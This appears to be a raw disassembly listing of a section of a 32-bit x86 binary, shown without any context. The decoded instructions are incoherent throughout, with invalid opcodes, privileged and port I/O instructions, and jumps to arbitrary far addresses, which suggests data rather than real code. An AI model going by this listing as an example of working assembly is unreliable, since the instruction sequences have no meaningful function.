  4136be:	ffree  st(4)
  4136c0:	jo     0x4136dc
  4136c2:	ret    0x41f0
  4136c5:	jno    0x41368a
  4136c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136c8:	aas    
  4136c9:	mov    edi,0xd4f7ae7c
  4136ce:	loope  0x413659
  4136d0:	mov    bl,0x8a
  4136d2:	inc    edi
  4136d3:	jmp    0xf8aa:0x2c9b7596
  4136da:	or     dh,BYTE PTR [eax+esi*8+0x52]
  4136de:	add    esp,edi
  4136e0:	xchg   ebx,eax
  4136e1:	rcl    DWORD PTR [ecx],1
  4136e3:	jnp    0x41368f
  4136e5:	fld    TBYTE PTR [ebp-0x3c]
  4136e8:	repnz leave 
  4136ea:	aaa    
  4136eb:	lods   eax,DWORD PTR ds:[esi]
  4136ec:	cmp    BYTE PTR [ebp+eax*8-0x50587058],bh
  4136f3:	mov    eax,ds:0x285b44f7
  4136f8:	ins    DWORD PTR es:[edi],dx
  4136f9:	fild   WORD PTR [ecx+0x4402ee1f]
  4136ff:	sbb    eax,0xf5fb2dd5
  413704:	ins    DWORD PTR es:[edi],dx
  413705:	jo     0x413775
  413707:	sbb    cl,cl
  413709:	out    0x7f,eax
  41370b:	sbb    DWORD PTR [edx+eiz*4],ebp
  41370e:	xchg   ebp,eax
  41370f:	push   cs
  413710:	and    BYTE PTR [ebx],0x2e
  413713:	mov    ebp,0xce58b8c8
  413718:	cs aad 0xe
  41371b:	push   0x3f
  41371d:	sub    eax,0x178828fc
  413722:	add    DWORD PTR [ebp+eax*8-0x9],edx
  413726:	push   ecx
  413727:	push   ebp
  413728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413729:	mov    ebp,0xd9d9cfe4
  41372e:	and    BYTE PTR [ebp-0x3668fd66],ah
  413734:	sbb    al,0x47
  413736:	das    
  413737:	or     al,0x4
  413739:	jecxz  0x413759
  41373b:	jmp    0x3dabdcf3
  413740:	test   al,0x5b
  413742:	int    0xfc
  413744:	push   ss
  413745:	xchg   esi,eax
  413746:	imul   esp,DWORD PTR [edi+0x68b4024c],0x233e5b8e
  413750:	addr16 retf 
  413752:	ret    
  413753:	hlt    
  413754:	jnp    0x413733
  413756:	popa   
  413757:	adc    al,BYTE PTR [edi-0x62]
  41375a:	enter  0x4f63,0x2a
  41375e:	sub    eax,0xdcce600d
  413763:	jo     0x41375c
  413765:	iret   
  413766:	sub    al,0x80
  413768:	and    ecx,DWORD PTR [edi*8-0x8836c72]
  41376f:	js     0x4136f2
  413771:	and    bl,BYTE PTR ds:0x5899636a
  413777:	sbb    eax,0x5b3580ff
  41377c:	dec    eax
  41377d:	outs   dx,BYTE PTR ds:[esi]
  41377e:	(bad)  
  41377f:	imul   ecx,DWORD PTR [ebx+ecx*1],0x4fc5c61a
  413786:	jp     0x4137c5
  413788:	xlat   BYTE PTR ds:[ebx]
  413789:	fld    TBYTE PTR [ebp-0x66]
  41378c:	repz xor eax,0xb4a3f2a2
  413792:	push   ebx
  413793:	mov    dl,0x6a
  413795:	clc    
  413796:	jmp    DWORD PTR [ebp-0x39]
  413799:	dec    esp
  41379a:	fcomip st,st(5)
  41379c:	cmp    BYTE PTR [ebp-0x6f],ah
  41379f:	inc    esp
  4137a0:	and    ebx,esp
  4137a2:	ret    0xc06f
  4137a5:	xchg   ebp,eax
  4137a6:	jp     0x413825
  4137a8:	fisttp QWORD PTR [eax+0x4c64a968]
  4137ae:	xlat   BYTE PTR ds:[ebx]
  4137af:	mov    ch,0x56
  4137b1:	(bad)  
  4137b3:	sbb    BYTE PTR [eax-0x7df120a3],0xa2
  4137ba:	test   al,0x14
  4137bc:	lahf   
  4137bd:	jmp    0x413832
  4137bf:	xor    esi,DWORD PTR [edx]
  4137c1:	xor    DWORD PTR [edi-0x16],ecx
  4137c4:	and    ebx,edx
  4137c6:	call   edx
  4137c8:	popa   
  4137c9:	jmp    0x413812
  4137cb:	enter  0x69b0,0x6a
  4137cf:	mov    DWORD PTR [edx+0x487b3f6e],ebp
  4137d5:	iret   
  4137d6:	daa    
  4137d7:	ja     0x41382e
  4137d9:	rcl    BYTE PTR [ecx-0x68],0x88
  4137dd:	gs loope 0x41382a
  4137e0:	gs icebp 
  4137e2:	fmul   DWORD PTR [ebx+ebx*2]
  4137e5:	je     0x41383b
  4137e7:	mov    edx,0xe48e03b9
  4137ec:	jb     0x413775
  4137ee:	mov    BYTE PTR gs:[ebx+0x4b],ah
  4137f2:	xor    al,BYTE PTR [edx]
  4137f4:	dec    DWORD PTR [ebx-0x4d]
  4137f7:	adc    eax,DWORD PTR [esi+0x184e13ae]
  4137fd:	xor    DWORD PTR [esi+0x3366a537],ecx
  413803:	ins    BYTE PTR es:[edi],dx
  413804:	lods   eax,DWORD PTR ds:[esi]
  413805:	shl    ah,1
  413807:	hlt    
  413808:	or     eax,0x75d48c97
  41380d:	aam    0x74
  41380f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413810:	pop    esi
  413811:	sub    eax,0x288f99b7
  413816:	int3   
  413817:	or     ch,bh
  413819:	cld    
  41381a:	std    
  41381b:	mov    bl,0xf7
  41381d:	jle    0x413897
  41381f:	sub    BYTE PTR [eax-0x80],0xb7
  413823:	sub    bh,dl
  413825:	cs (bad) 
  413828:	cmc    
  413829:	(bad)
  41382d:	scas   eax,DWORD PTR es:[edi]
  41382e:	stos   BYTE PTR es:[edi],al
  41382f:	aas    
  413830:	dec    eax
  413831:	xor    eax,0xbdea1f81
  413836:	int3   
  413837:	or     BYTE PTR [eax-0x5a3993f8],0x38
  41383e:	fwait
  41383f:	std    
  413840:	fidiv  WORD PTR [edx+0x22]
  413843:	push   ecx
  413844:	in     al,0x3e
  413846:	lock lds ebp,FWORD PTR [ecx+edi*8]
  41384a:	xchg   ecx,eax
  41384b:	cmp    BYTE PTR [eax+0x7295abda],dl
  413851:	dec    esp
  413852:	scas   eax,DWORD PTR es:[edi]
  413853:	in     al,dx
  413854:	xor    edi,0xffffffb3
  413857:	popf   
  413858:	mov    ch,0xf3
  41385a:	pop    esp
  41385b:	jp     0x413840
  41385d:	sub    BYTE PTR [esi+0x41d95007],bl
  413863:	add    ebp,DWORD PTR [ebp+ebp*1+0x71]
  413867:	and    bh,dh
  413869:	or     eax,0x9bfead68
  41386e:	icebp  
  41386f:	gs popf 
  413871:	dec    edi
  413872:	adc    eax,0x60e2d5e9
  413877:	mov    esi,0x67b698a3
  41387c:	loopne 0x41388b
  41387e:	fst    DWORD PTR [eax-0x4c9a6888]
  413884:	fs hlt 
  413886:	dec    eax
  413887:	sub    DWORD PTR [eax],ebp
  413889:	int    0xe3
  41388b:	cld    
  41388c:	test   DWORD PTR [ecx+0x4a11dcf1],0x24494470
  413896:	ret    0x4ff9
  413899:	sbb    eax,0x6c211637
  41389e:	jae    0x413844
  4138a0:	stos   DWORD PTR es:[edi],eax
  4138a1:	add    ah,bl
  4138a3:	sub    al,0x45
  4138a5:	mov    eax,0x56d1a21f
  4138aa:	mov    eax,0x3d4e28e6
  4138af:	inc    eax
  4138b0:	dec    edi
  4138b1:	mov    ds:0x370c054c,eax
  4138b6:	jno    0x4138c2
  4138b8:	jge    0x413905
  4138ba:	dec    ecx
  4138bb:	ret    
  4138bc:	or     bl,dl
  4138be:	das    
  4138bf:	into   
  4138c0:	cmc    
  4138c1:	adc    edx,esp
  4138c3:	fdivr  DWORD PTR ds:0x1b180d90
  4138c9:	sub    BYTE PTR [ebx],al
  4138cb:	mov    ss,WORD PTR [eax]
  4138cd:	push   0xffffff83
  4138cf:	in     eax,0xb1
  4138d1:	repnz xor bl,BYTE PTR [esi-0x78e26b94]
  4138d8:	xlat   BYTE PTR ds:[ebx]
  4138d9:	push   cs
  4138da:	js     0x413874
  4138dc:	rcr    DWORD PTR [ecx],1
  4138de:	xchg   esp,eax
  4138df:	jg     0x41389a
  4138e1:	cmc    
  4138e2:	nop
  4138e3:	inc    ecx
  4138e4:	sub    BYTE PTR [edx],ch
  4138e6:	test   BYTE PTR ds:0xb15c7855,dl
  4138ec:	jp     0x4138df
  4138ee:	sbb    dh,BYTE PTR [edx-0x4fd44feb]
  4138f4:	push   eax
  4138f5:	lds    ebp,FWORD PTR [ebp-0x2ee27ec1]
  4138fb:	loopne 0x41392b
  4138fd:	mov    bl,0x74
  4138ff:	and    DWORD PTR [ecx+esi*2],0x48
  413903:	mov    al,ds:0x587de780
  413908:	sub    edx,DWORD PTR [ebx-0x45808c36]
  41390e:	adc    bh,cl
  413910:	mov    edx,0x590d0e65
  413915:	pop    eax
  413916:	pushf  
  413917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413918:	mov    al,ds:0xb4acda80
  41391d:	stc    
  41391e:	inc    esp
  41391f:	stos   DWORD PTR es:[edi],eax
  413920:	fs pop edi
  413922:	(bad)  
  413923:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  413925:	jge    0x41393e
  413927:	pop    ecx
  413928:	or     BYTE PTR [ebx],ch
  41392a:	sar    BYTE PTR [edi+0xe],cl
  41392d:	lods   al,BYTE PTR ds:[esi]
  41392e:	push   0xffffff94
  413930:	xchg   ebp,eax
  413931:	fbld   TBYTE PTR [edx+edx*8-0x5e98a63f]
  413938:	cmp    eax,0xbb1d7487
  41393d:	fwait
  41393e:	pushf  
  41393f:	mov    ch,0x9f
  413941:	shl    BYTE PTR [edi+eiz*8-0x22],cl
  413945:	sbb    eax,0xd0d61835
  41394a:	push   eax
  41394b:	adc    BYTE PTR [eax+0x6c],bl
  41394e:	shl    DWORD PTR [edx+0x2f],0x2a
  413952:	bt     DWORD PTR [esi+0x1a],edx
  413956:	push   ebx
  413957:	test   eax,0x905f42b8
  41395c:	ror    BYTE PTR [edi+0x7342d22a],1
  413962:	aaa    
  413963:	(bad)  
  413964:	adc    al,0x2a
  413966:	xchg   ebp,eax
  413967:	leave  
  413968:	sub    DWORD PTR [ecx+esi*2],esi
  41396b:	jns    0x413969
  41396d:	pusha  
  41396e:	jmp    0xb723070d
  413973:	pusha  
  413974:	inc    eax
  413975:	mov    cl,0x75
  413977:	cs jns 0x41397b
  41397a:	(bad)  ds:0x42b53002
  413980:	pop    ds
  413981:	fisttp DWORD PTR [eax]
  413983:	jle    0x4139e5
  413985:	ins    BYTE PTR es:[edi],dx
  413986:	jp     0x4139c7
  413988:	xchg   edi,eax
  413989:	and    eax,0xf392078b
  41398e:	sub    BYTE PTR [eax],0x11
  413991:	out    0x7,eax
  413993:	test   DWORD PTR [eax-0x5a],edx
  413996:	sbb    al,0xb3
  413998:	mov    eax,ds:0x11f8f42
  41399d:	cmp    ebx,DWORD PTR [edx]
  41399f:	ds enter 0xb2f6,0xdc
  4139a4:	pop    ebx
  4139a5:	inc    edi
  4139a6:	sbb    BYTE PTR [ecx+0x7b],dh
  4139a9:	addr16 jo 0x413989
  4139ac:	inc    eax
  4139ad:	enter  0x1f39,0x45
  4139b1:	xor    al,0xe0
  4139b3:	sub    DWORD PTR [edx],ecx
  4139b5:	push   ds
  4139b6:	dec    ecx
  4139b7:	or     BYTE PTR [ebp-0x2],cl
  4139ba:	test   DWORD PTR [edx+0x1edd1746],0x1148ae06
  4139c4:	nop
  4139c5:	mov    cl,0x29
  4139c7:	add    bl,0xfb
  4139ca:	sub    BYTE PTR [edi+0x1c040a18],0xbc
  4139d1:	loope  0x413a14
  4139d3:	push   ebp
  4139d4:	lods   eax,DWORD PTR ds:[esi]
  4139d5:	ins    DWORD PTR es:[edi],dx
  4139d6:	outs   dx,BYTE PTR ds:[esi]
  4139d7:	in     eax,0x58
  4139d9:	repz sub al,0x99
  4139dc:	test   DWORD PTR [ecx+0x5b0e56c],ecx
  4139e2:	dec    edi
  4139e3:	cmp    eax,0x5f8a40c0
  4139e8:	push   esp
  4139e9:	inc    esi
  4139ea:	pop    ebp
  4139eb:	int    0xd5
  4139ed:	rcr    BYTE PTR [eax+0x50ebae5e],cl
  4139f3:	ret    0xdee0
  4139f6:	lock adc ebx,ecx
  4139f9:	sub    eax,0x58dbd50b
  4139fe:	or     esp,esp
  413a00:	and    DWORD PTR [edi],ebx
  413a02:	mov    eax,0xc1d3ead4
  413a07:	add    eax,0x22720578
  413a0c:	add    DWORD PTR [ebp-0x3f],0x4b25e832
  413a13:	jmp    0xdbdb5c08
  413a18:	push   esp
  413a19:	sar    BYTE PTR [edx-0x33],cl
  413a1c:	push   0x75a77b2c
  413a21:	loop   0x4139dc
  413a23:	cmp    DWORD PTR [edi+0x5f41bfa9],ebx
  413a29:	dec    ecx
  413a2a:	rol    cl,cl
  413a2c:	mov    cs,WORD PTR [ebx-0x5e]
  413a2f:	cmp    DWORD PTR [ecx-0x70c51e9e],edx
  413a35:	mov    eax,0x8c957942
  413a3a:	ja     0x4139ce
  413a3c:	out    0x52,al
  413a3e:	xor    BYTE PTR ds:0xfc06e2b,0x89
  413a45:	mov    dh,0xa9
  413a47:	(bad)  
  413a49:	pop    ecx
  413a4a:	pop    eax
  413a4b:	xor    cl,BYTE PTR [ebx+0x2e]
  413a4e:	addr16 jnp 0x4139e1
  413a51:	add    esi,edi
  413a53:	adc    edi,esp
  413a55:	cmp    ecx,DWORD PTR es:[ebp-0x4a096423]
  413a5c:	dec    ecx
  413a5d:	add    BYTE PTR [ebp+0x5d],0x6
  413a61:	jg     0x413a54
  413a63:	leave  
  413a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a65:	fimul  DWORD PTR [edi+0x606590e1]
  413a6b:	push   edx
  413a6c:	out    0x97,al
  413a6e:	mov    esi,0x6a1e75d3
  413a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a74:	repnz (bad) 
  413a76:	mov    ah,0x8d
  413a78:	je     0x413a48
  413a7a:	adc    eax,0xdff78dd5
  413a7f:	cmp    ecx,DWORD PTR [ebx-0x71]
  413a82:	pushf  
  413a83:	mov    edx,0xd030e5de
  413a88:	ret    
  413a89:	in     eax,dx
  413a8a:	jmp    0x55e59eaa
  413a8f:	adc    dh,BYTE PTR [edi-0x5d9fb15b]
  413a95:	fmul   DWORD PTR [edx+0x526eed75]
  413a9b:	test   eax,0x17eae002
  413aa0:	or     al,0x4a
  413aa2:	out    dx,eax
  413aa3:	ret    0x902f
  413aa6:	or     al,0x2a
  413aa8:	sbb    al,0xc4
  413aaa:	ret    
  413aab:	lods   eax,DWORD PTR ds:[esi]
  413aac:	sbb    ebx,DWORD PTR [esi-0x31]
  413aaf:	pop    esi
  413ab0:	add    DWORD PTR [edx+ecx*1+0x412c8c1a],ebp
  413ab7:	mov    ch,0x5
  413ab9:	stos   BYTE PTR es:[edi],al
  413aba:	es sti 
  413abc:	clc    
  413abd:	rol    al,cl
  413abf:	add    edi,ecx
  413ac1:	jb     0x413abe
  413ac3:	out    0x2d,eax
  413ac5:	push   ebx
  413ac6:	test   al,0xbf
  413ac8:	dec    esi
  413ac9:	out    0x84,al
  413acb:	adc    al,0xc3
  413acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ace:	xchg   esi,eax
  413acf:	inc    esi
  413ad0:	push   ebx
  413ad1:	xor    eax,0xd7457dc4
  413ad6:	sbb    edx,DWORD PTR [edi]
  413ad8:	cmp    al,0xb7
  413ada:	pop    edx
  413adb:	icebp  
  413adc:	sbb    DWORD PTR [edi+0x6d],edi
  413adf:	fild   QWORD PTR [ecx+0x2b]
  413ae2:	mov    eax,0x5f821c25
  413ae7:	mov    cs,WORD PTR [ebx]
  413ae9:	inc    esi
  413aea:	and    BYTE PTR [eax-0x37],cl
  413aed:	(bad)  
  413aee:	pop    ebp
  413aef:	ret    
  413af0:	cli    
  413af1:	sub    al,0x29
  413af3:	bound  edi,QWORD PTR [edi]
  413af5:	dec    ebx
  413af6:	adc    al,0x62
  413af8:	fwait
  413af9:	xchg   BYTE PTR [esp+edi*8+0x1c0ff1b5],al
  413b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b01:	xor    ah,bl
  413b03:	mov    ebx,0xc075cef9
  413b08:	dec    ebp
  413b09:	retf   
  413b0a:	icebp  
  413b0b:	shl    dh,1
  413b0d:	push   edi
  413b0e:	inc    edi
  413b0f:	xchg   ebp,eax
  413b10:	(bad)  
  413b11:	ss pop ss
  413b13:	popf   
  413b14:	or     ecx,DWORD PTR [esi]
  413b16:	push   ebp
  413b17:	sub    al,0x8a
  413b19:	icebp  
  413b1a:	into   
  413b1b:	loopne 0x413aff
  413b1d:	repnz lock xor al,BYTE PTR [esi-0x31275cbc]
  413b25:	imul   ebx,DWORD PTR [edi],0x69
  413b28:	sbb    BYTE PTR [eax+0x36374e84],dh
  413b2e:	sar    edx,1
  413b30:	jae    0x413b20
  413b32:	mov    edi,0xc3d271c3
  413b37:	sub    ebp,eax
  413b39:	add    al,0xd5
  413b3b:	jne    0x413b57
  413b3d:	or     al,0x75
  413b3f:	bound  ebp,QWORD PTR [ecx-0x76]
  413b42:	out    0x28,eax
  413b44:	cmp    edi,DWORD PTR [ecx+0x68ae8602]
  413b4a:	add    ecx,ebx
  413b4c:	ins    DWORD PTR es:[edi],dx
  413b4d:	pop    edi
  413b4e:	xchg   bh,ah
  413b50:	fistp  QWORD PTR [ebx+0x59]
  413b53:	sub    cl,BYTE PTR [esi+edx*8+0x55]
  413b57:	daa    
  413b58:	sbb    eax,DWORD PTR [edi+ebx*4]
  413b5b:	adc    DWORD PTR [ecx-0x2e],edi
  413b5e:	mov    ebx,0xaf9639f5
  413b63:	sub    ch,BYTE PTR [edx-0x5f]
  413b66:	push   ss
  413b67:	jnp    0x413b87
  413b69:	xor    dl,BYTE PTR [esi]
  413b6b:	fsub   QWORD PTR [ecx+0x56]
  413b6e:	sbb    dh,al
  413b70:	mov    ah,0xc0
  413b72:	inc    ecx
  413b73:	ins    BYTE PTR es:[edi],dx
  413b74:	outs   dx,BYTE PTR ds:[esi]
  413b75:	jmp    0x413bbd
  413b77:	mov    dh,0x93
  413b79:	fidivr DWORD PTR [eax]
  413b7b:	jg     0x413b50
  413b7d:	mov    dh,0x6a
  413b7f:	lods   al,BYTE PTR ds:[esi]
  413b80:	jbe    0x413b17
  413b82:	pop    ecx
  413b83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b84:	stos   BYTE PTR es:[edi],al
  413b85:	(bad)  
  413b86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b87:	retf   
  413b88:	pop    esi
  413b89:	sub    DWORD PTR [eax+0x64d97f8f],edi
  413b8f:	push   cs
  413b90:	xor    DWORD PTR [ebp-0x66],esi
  413b93:	xlat   BYTE PTR ds:[ebx]
  413b94:	push   ebp
  413b95:	fwait
  413b96:	jmp    0x8e8269e1
  413b9b:	xchg   ebx,eax
  413b9c:	mov    cl,0x6a
  413b9e:	test   al,0x2e
  413ba0:	cwde   
  413ba1:	push   esi
  413ba2:	je     0x413b55
  413ba4:	or     al,0x3e
  413ba6:	or     BYTE PTR [eax+ebx*4+0x595a4ec9],bh
  413bad:	scas   al,BYTE PTR es:[edi]
  413bae:	ret    0xebd5
  413bb1:	and    bl,BYTE PTR [ebp+0x6e027ed7]
  413bb7:	inc    ebp
  413bb8:	dec    edi
  413bb9:	sub    DWORD PTR [esi],ecx
  413bbb:	mov    dh,0x71
  413bbd:	lock cmp eax,0xdf3bdc10
  413bc3:	cmp    DWORD PTR [eax-0x1e],0xc9ea675f
  413bca:	cmp    ecx,DWORD PTR [edx]
  413bcc:	rcl    DWORD PTR [ecx+esi*1+0x37ea2417],1
  413bd3:	or     al,bl
  413bd5:	pushf  
  413bd6:	ins    DWORD PTR es:[edi],dx
  413bd7:	bound  eax,QWORD PTR [edx+0x68]
  413bda:	in     al,dx
  413bdb:	push   0x335c67aa
  413be0:	pop    esp
  413be1:	aaa    
  413be2:	inc    ecx
  413be3:	add    cl,BYTE PTR [edi-0x7a2ca497]
  413be9:	pop    ebp
  413bea:	test   al,0xb9
  413bec:	mov    ecx,0x1582d674
  413bf1:	sahf   
  413bf2:	sub    DWORD PTR [ebx-0x79],edx
  413bf5:	or     edx,edx
  413bf7:	ret    
  413bf8:	punpckldq mm7,mm5
  413bfb:	mov    ch,ah
  413bfd:	jmp    0xf8df:0xff6dcb91
  413c04:	into   
  413c05:	mov    al,0xa0
  413c07:	push   ss
  413c08:	sti    
  413c09:	inc    ecx
  413c0a:	rol    BYTE PTR [esi-0x26],0x2c
  413c0e:	das    
  413c0f:	pop    esi
  413c10:	out    0x47,al
  413c12:	jl     0x413c17
  413c14:	add    al,0xe3
  413c16:	and    BYTE PTR [esi],bl
  413c18:	jl     0x413bf6
  413c1a:	jle    0x413c84
  413c1c:	push   cs
  413c1d:	scas   eax,DWORD PTR es:[edi]
  413c1e:	fisub  DWORD PTR [ecx]
  413c20:	jmp    0x413c05
  413c22:	add    ebx,edi
  413c24:	jnp    0x413c36
  413c26:	lods   eax,DWORD PTR ds:[esi]
  413c27:	int3   
  413c28:	mov    fs,WORD PTR [ebp+eiz*8+0x4052f1e4]
  413c2f:	cmp    BYTE PTR [esi+ebx*2],cl
  413c32:	cdq    
  413c33:	lods   eax,DWORD PTR ds:[esi]
  413c34:	xchg   edx,eax
  413c35:	push   ebx
  413c36:	mov    al,0x69
  413c38:	iret   
  413c39:	fstp   TBYTE PTR [ecx-0x1ae4062b]
  413c3f:	or     eax,0xbbfb2b20
  413c44:	outs   dx,BYTE PTR ds:[esi]
  413c45:	hlt    
  413c46:	out    0x62,al
  413c48:	pop    es
  413c49:	mov    ah,0x8c
  413c4b:	sub    eax,0x88b6eac5
  413c50:	xchg   esi,eax
  413c51:	or     esp,ecx
  413c53:	pushf  
  413c54:	repz pushf 
  413c56:	dec    ecx
  413c57:	sahf   
  413c58:	add    ecx,DWORD PTR [ecx+0x38]
  413c5b:	add    DWORD PTR [esi+0x17662c97],ebp
  413c61:	out    0x3a,eax
  413c63:	add    ebp,DWORD PTR [edx]
  413c65:	xor    DWORD PTR [edx+0x646cedfc],esi
  413c6b:	dec    edi
  413c6c:	sub    edi,DWORD PTR [ebx-0x4d]
  413c6f:	lods   al,BYTE PTR ds:[esi]
  413c70:	pop    edx
  413c71:	rcr    BYTE PTR [ebp-0x80],1
  413c74:	add    DWORD PTR [esi+0x4aa8ddce],eax
  413c7a:	pop    ds
  413c7b:	push   ss
  413c7c:	dec    ecx
  413c7d:	mov    al,ds:0x30563054
  413c82:	(bad)  [edi]
  413c84:	cmp    al,0x68
  413c86:	xor    al,0x4a
  413c88:	sbb    edi,esi
  413c8a:	out    dx,al
  413c8b:	xchg   DWORD PTR [edi+0x6e4f305c],esi
  413c91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c92:	mov    ch,0x3d
  413c94:	cs mov bh,0x8c
  413c97:	cmc    
  413c98:	ss icebp 
  413c9a:	xchg   ecx,eax
  413c9b:	aas    
  413c9c:	int3   
  413c9d:	xchg   edi,eax
  413c9e:	pop    esp
  413c9f:	shl    DWORD PTR [ebx-0x1916e2bf],0x21
  413ca6:	(bad)  
  413ca7:	jge    0x413cda
  413ca9:	fs dec edi
  413cab:	(bad)  
  413cac:	jno    0x413c88
  413cae:	fisubr DWORD PTR [ebx-0x23]
  413cb1:	gs push ebx
  413cb3:	test   BYTE PTR [edi],bl
  413cb5:	adc    al,0x93
  413cb7:	push   esp
  413cb8:	int3   
  413cb9:	(bad)  
  413cba:	js     0x413c3c
  413cbc:	sar    DWORD PTR [ebp+0x28b99a27],1
  413cc2:	je     0x413ce6
  413cc4:	push   esi
  413cc5:	sbb    BYTE PTR [eax+edx*1],bl
  413cc8:	imul   edi,esp,0xffffffe1
  413ccb:	daa    
  413ccc:	jno    0x413c90
  413cce:	add    esp,eax
  413cd0:	xchg   ecx,eax
  413cd1:	aad    0xd6
  413cd3:	mov    dh,0xd1
  413cd5:	popf   
  413cd6:	(bad)  
  413cd7:	out    dx,al
  413cd8:	add    ch,BYTE PTR [ebx]
  413cda:	add    BYTE PTR [ebx-0x35],bh
  413cdd:	sti    
  413cde:	inc    ebp
  413cdf:	push   cs
  413ce0:	sbb    eax,0x3be2c8f8
  413ce5:	stc    
  413ce6:	pminsw mm4,QWORD PTR [ebp+0x2413a726]
  413ced:	popa   
  413cee:	push   esp
  413cef:	jecxz  0x413c99
  413cf1:	fiadd  DWORD PTR [ebx+0x4a]
  413cf4:	outs   dx,BYTE PTR ds:[esi]
  413cf5:	ins    DWORD PTR es:[edi],dx
  413cf6:	das    
  413cf7:	inc    ecx
  413cf8:	(bad)
  413cfd:	sar    al,cl
  413cff:	call   0xa71bfd82
  413d04:	adc    eax,ebp
  413d06:	fsubr  DWORD PTR [esi]
  413d08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d09:	sbb    ch,BYTE PTR [edx]
  413d0b:	fbstp  TBYTE PTR [edx]
  413d0d:	pop    ebp
  413d0e:	int    0x19
  413d10:	leave  
  413d11:	pop    eax
  413d12:	mov    ds:0x1f17dfc3,eax
  413d17:	stos   DWORD PTR es:[edi],eax
  413d18:	add    ecx,DWORD PTR [ecx]
  413d1a:	or     al,0x71
  413d1c:	and    BYTE PTR [edx],ah
  413d1e:	out    dx,eax
  413d1f:	push   ebp
  413d20:	dec    esp
  413d21:	outs   dx,DWORD PTR ds:[esi]
  413d22:	pop    ecx
  413d23:	into   
  413d24:	sub    ch,dl
  413d26:	(bad)  
  413d27:	es movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d2a:	cmp    BYTE PTR [eax],ch
  413d2c:	ret    0xc8d3
  413d2f:	mov    ds:0xc2624ef9,al
  413d34:	loope  0x413d8d
  413d36:	jbe    0x413d66
  413d38:	sbb    BYTE PTR [edi],al
  413d3a:	xchg   DWORD PTR [ebx+0xd],esi
  413d3d:	pop    ecx
  413d3e:	pop    edi
  413d3f:	cmp    DWORD PTR ds:0x5eee7650,ebp
  413d45:	icebp  
  413d46:	sar    DWORD PTR [edi],0xe3
  413d49:	outs   dx,DWORD PTR ds:[esi]
  413d4a:	std    
  413d4b:	outs   dx,BYTE PTR ds:[esi]
  413d4c:	in     al,dx
  413d4d:	sbb    cl,BYTE PTR [edx]
  413d4f:	aaa    
  413d50:	jbe    0x413d4f
  413d52:	sahf   
  413d53:	jmp    0xe4c3:0xbc60b389
  413d5a:	sub    BYTE PTR [ebp-0x648e28dd],al
  413d60:	jmp    0x5eed7acf
  413d65:	mov    ds,WORD PTR ds:0xe1b815b4
  413d6b:	pop    esp
  413d6c:	int3   
  413d6d:	jbe    0x413d9e
  413d6f:	test   eax,0x40138a29
  413d74:	(bad)  
  413d75:	and    BYTE PTR [edi-0x21789a5c],cl
  413d7b:	loope  0x413d97
  413d7d:	sub    dl,BYTE PTR es:[ebx+0x6a]
  413d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d82:	ins    BYTE PTR es:[edi],dx
  413d83:	mov    ebx,0xa9ef6563
  413d88:	or     eax,0xc4658043
  413d8d:	sub    al,0x25
  413d8f:	js     0x413d33
  413d91:	or     al,0xbf
  413d93:	dec    edx
  413d94:	push   edi
  413d95:	(bad)  
  413d96:	xchg   edx,eax
  413d97:	jae    0x413d5c
  413d99:	jne    0x413d59
  413d9b:	scas   al,BYTE PTR es:[edi]
  413d9c:	(bad)  [edi-0x3c]
  413d9f:	inc    ebx
  413da0:	adc    al,0x2c
  413da2:	jbe    0x413d3c
  413da4:	leave  
  413da5:	popf   
  413da6:	or     dl,dh
  413da8:	pop    ebp
  413da9:	xchg   edi,eax
  413daa:	sbb    dh,dh
  413dac:	mov    al,ds:0x1385f6a4
  413db1:	into   
  413db2:	dec    eax
  413db3:	mov    edx,0x1bc31a32
  413db8:	and    al,0x85
  413dba:	loope  0x413e19
  413dbc:	sahf   
  413dbd:	data16 aas 
  413dbf:	clc    
  413dc0:	stc    
  413dc1:	jl     0x413e01
  413dc3:	leave  
  413dc4:	adc    al,0xc8
  413dc6:	out    dx,eax
  413dc7:	jno    0x413d71
  413dc9:	fldenv [ebp-0x7ea8e780]
  413dcf:	xor    DWORD PTR [esi],0xcdfa5761
  413dd5:	shr    DWORD PTR [edi-0x48324f85],0x44
  413ddc:	fbld   TBYTE PTR [ecx+0x6a]
  413ddf:	outs   dx,BYTE PTR ds:[esi]
  413de0:	repz ret 
  413de2:	ss cmp eax,0x4dce18aa
  413de8:	movsx  edi,ax
  413deb:	mov    ah,0xc0
  413ded:	add    bl,BYTE PTR ds:0x8e8ad00b
  413df3:	and    BYTE PTR [edx],dl
  413df5:	jno    0x413da8
  413df7:	outs   dx,BYTE PTR ds:[esi]
  413df8:	mov    cs:0xe043f244,eax
  413dfe:	xchg   BYTE PTR [eax],dl
  413e00:	fisub  DWORD PTR [ebx-0x8]
  413e03:	rol    DWORD PTR [ebx+0x62],1
  413e06:	js     0x413e13
  413e08:	and    ebx,ebx
  413e0a:	jmp    0x413e62
  413e0c:	inc    edx
  413e0d:	fldcw  WORD PTR [edi]
  413e0f:	repz in al,dx
  413e11:	mov    bh,0xd7
  413e13:	(bad)  
  413e14:	mov    edx,0x3e65b1c9
  413e19:	jle    0x413e39
  413e1b:	cld    
  413e1c:	cdq    
  413e1d:	sbb    DWORD PTR [esi],ebp
  413e1f:	mov    esp,DWORD PTR [ebx-0x66]
  413e22:	mul    BYTE PTR [edi+0x2e]
  413e25:	cmp    DWORD PTR [ecx+0x7c],esp
  413e28:	fstp   QWORD PTR [edx+eiz*2]
  413e2b:	inc    eax
  413e2c:	hlt    
  413e2d:	popa   
  413e2e:	int3   
  413e2f:	into   
  413e30:	stc    
  413e31:	dec    ebx
  413e32:	pop    edi
  413e33:	and    ch,BYTE PTR [ebx]
  413e35:	or     BYTE PTR [edx-0x2a],ah
